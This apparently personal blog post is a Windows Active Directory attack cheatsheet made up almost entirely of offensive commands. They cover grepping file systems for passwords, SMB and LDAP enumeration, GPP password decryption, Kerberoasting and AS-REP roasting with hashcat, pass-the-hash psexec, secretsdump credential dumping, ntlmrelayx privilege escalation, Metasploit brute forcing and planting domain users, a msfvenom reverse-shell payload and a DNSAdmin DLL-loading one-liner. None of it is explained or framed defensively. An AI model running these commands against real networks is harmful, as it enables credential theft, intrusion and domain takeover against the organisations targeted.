---
layout: post
title: Windows AD Cheatsheet
---

INFO: https://ippsec.rocks/
INFO PATH TRAVERSAL: https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/

cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*

Search for a file with a certain filename

dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini

RECON: 
nmap -sC -sV -oA nmap-name IP
nmap -sTV -p 1-65535 -oN nmap_tcp_scan IP
nmap --script safe -p 445 IP
nmap --script smb-enum-services -p 445 ip -d
nmap -p 445 --script safe -Pn
nmap -p 445 --script vuln -Pn IP
nmap -p 389 --script ldap-rootdse -Pn 
nmap -p 389 --script ldap-search -Pn 
smbclient -L IP
smbclient //IP/Replication
    smb: \> recurse ON
    smb: \> prompt OFF
    smb: \> mget *
    and now all files download to attack machine
ldapsearch -x -h IP -s base    
ldapsearch -x -h IP -s base namingcontexts
ldapsearch -x -h IP -s sub -b 'DC=MEGABANK,DC=LOCAL'

smbmap -H IP
smbmap -R Replication -H IP
smbmap -R Replication -H IP -A Groups.xml -q
#View Remote SMB shares and their permissions in a tabular format
smbmap -u <username> -p <password> -H <ip_addr>
#View directory contents along with permissions details recursively 
smbmap -u <username> -p <password> -H <ip_addr> -r
search user or passwd(HASH) and copy
apt-get install gpp-decrypt 
gpp-decrypt hash 
Impacket ./GetADUsers -all -dc-ip IP domain/user
Impacket ./psexec.py domain/user@ip
smbmap -d domain -u user -p password -H IP
smbmap -d domain -u user -p password -H IP -R Users
In WINDOWS: runass /netonly /user:domain\user cmd (and other cmd terminal open)
in Win CMD: ps
    Test-NetConnection -ComputerName IP -Port 389
    search "TCPTestSucceeded : True"
    upload SharpHound.exe
    .\SharpHound.exe -c all -d domain --domaincontroller ip
If and user is kerberosteable use impacket GETUserSPNs.py   
impacket ./GetUserSPNs.py -request -dc-ip ip domain/user
and copy the kerbeross ticket and use hashcat
    hashcat 13100 Kerberos 5 TGS-REP Etype 23
    run: hashcat -m 13100 hash /user/share/wordlist/rockyou.txt
    
/mnt/smb    
mount -t cifs //IP/Backups /mnt/smb
apt-get install libguestfs-tools
mkdir /mtn/vhd 
guestmount --add filebackup.vhd --inspector --ro -v /mnt/vhd

Net user user
Net localgroup group
whoami /groups

ENUM: enum4linux -a IP
enum4linux IP
TGT (ticket-granting ticket): GetNPUsers.py -dc-ip IP -no-pass DOMAIN/user
CRACK: hashcat -m 18200 -a 0 -w 3 machine.hash /usr/share/wordlists/rockyou.txt --force
CONNECT: ruby evil-winrm.rb -i ip -u 'user' -p 'password' -P 5985
Privilege Escalation: 
BloodHound https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1 
    upload /root/SharpHound.ps1 c:\temp\SharpHound.ps1
    Import-module ./SharpHound.ps1
    Invoke-BloodHound -CollectionMethod All
    download 'date_bloodhound.zip'
    neo4j start
    bloodhound
    Add user to group: net group "GROUP" user /add
    python ntlmrelayx.py -t ldap://ip1 --escalate-user 'usuario'
    download secrets: secretsdump DOMAIN/user:password@ip
    psexec.py -hashes :12345a11b6cd90ef43g32h72i07jkln6 DOMAIN/admin@ip powershell.exe
    
python -m SimpleHTTPServer

Get-Process 
rpcclient -U 'user%password' ip
RPCCLIENT $> lookupnames administrator

msfconsole: 
use auxiliary/scanner/smb/smb_login
    setg USER_FILE users.txt
    setg USERPASS_FILE passwords.txt
    setg RHOSTS ip
    run
    
use auxiliary/scanner/winrm/winrm_login
    setg DOMAIN dominio
    set pass_file passwords.txt
    set user_file users.txt
    setg RHOSTS ip
    run
    
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set rhost 192.168.0.104
msf exploit(psexec) > set rport 445
msf exploit(psexec) > set smbuser administrator
msf exploit(psexec) > set smbpass Ignite@123
msf exploit(psexec) > exploit

enumerate computers
msf > use post/windows/gather/enum_ad_computers
msf post(enum_ad_computers) > set filter objectCategory=computer
msf post(enum_ad_computers) > set session 1
msf post(enum_ad_computers) > exploit

Find All Share Folder in Active Directory
msf > post/windows/gather/enum_shares
msf post(enum_shares) > set session 1
msf post(enum_shares) > exploit

Gather All Groups in Active Directory
msf > use post/windows/gather/enum_ad_groups
msf post(enum_ad_groups) > set session 1
msf post(enum_ad_groups) > exploit

To  Add Any User in Active Directory
msf > use post/windows/manage/add_user_domain
msf post(add_user_domain) > set addtodomain true
msf post(add_user_domain) > set username hacker
msf post(add_user_domain) > set password abcd@123
msf post(add_user_domain) > set session 1
msf post(add_user_domain) > exploit

Delete Any  User from Active Directory
msf > use post/windows/manage/delete_user
msf post(delete_user) > set username hacker
msf post(delete_user) > set session 1
msf post(delete_user) > exploit

git clone https://github.com/Hackplayers/evil-winrm
    cd evil-winrm
    ruby evil-winrm.rb
    ruby evil-winrm.rb -u usuario - p password ' -i ip
    bundle install
    PS C:\Users\svr>gci
    gci -recurse . | select fullname
    
git clone https://github.com/fox-it/BloodHound.py.git
cd BloodHound.py/ && pip install .    
bloodhound-python -d domain -u user@domain -p password -ns ipserver -c all
https://github.com/fox-it/Invoke-ACLPwn
.\Invoke-ACLPwn.ps1 -domain domain.local -username "domain\user" -SharpHoundLocation "C:\Users\user\Documents\Bloodhound\SharpHound.exe" -mimiKatzLocation "C:\Users\user\Documents\Bloodhound\mimikatz.exe" 

https://github.com/AonCyberLabs/Windows-Exploit-Suggester/
https://github.com/interference-security/kali-windows-binaries or (KALI) /usr/share/windows-resources/binaries/

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe

https://github.com/fox-it/aclpwn.py
impacket ./psexec.py domain/admin@ip and get CMD

xcopy \\computer1\source\*.* \\Computer2\target

DNS One Line
https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
dnscmd.exe /config /serverlevelplugindll \pathtodll
https://eternallybored.org/misc/netcat/

https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
unserialize:
https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html
https://spookysec.net/2019-11-17-kerberos-abuse/
https://github.com/ropnop/kerbrute
